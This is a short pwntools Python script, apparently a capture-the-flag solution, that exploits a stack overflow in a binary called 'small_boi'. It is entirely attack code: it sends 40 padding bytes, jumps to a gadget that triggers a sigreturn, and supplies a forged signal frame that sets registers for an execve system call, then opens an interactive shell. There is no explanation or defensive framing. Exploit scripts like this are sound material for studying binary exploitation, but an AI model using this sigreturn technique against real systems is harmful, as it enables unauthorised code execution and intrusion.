#!/usr/bin/python3
from pwn import *

exe = "./small_boi"

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript = '''
    b* main
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
seteaxcall = p64(0x400180)
p = process(exe)
# building fake frame
# automated
gdb.attach(p, api = True)
context.arch = "amd64"
framez = SigreturnFrame()
framez.rdi = 0x4001ca
framez.rsi = 0x00
framez.rax = 0x3b
framez.rdx = 0x00
framez.rip = 0x400185
p.send(40*b"a" + seteaxcall + bytes(framez))
# p.sendline(cyclic(200))
p.interactive()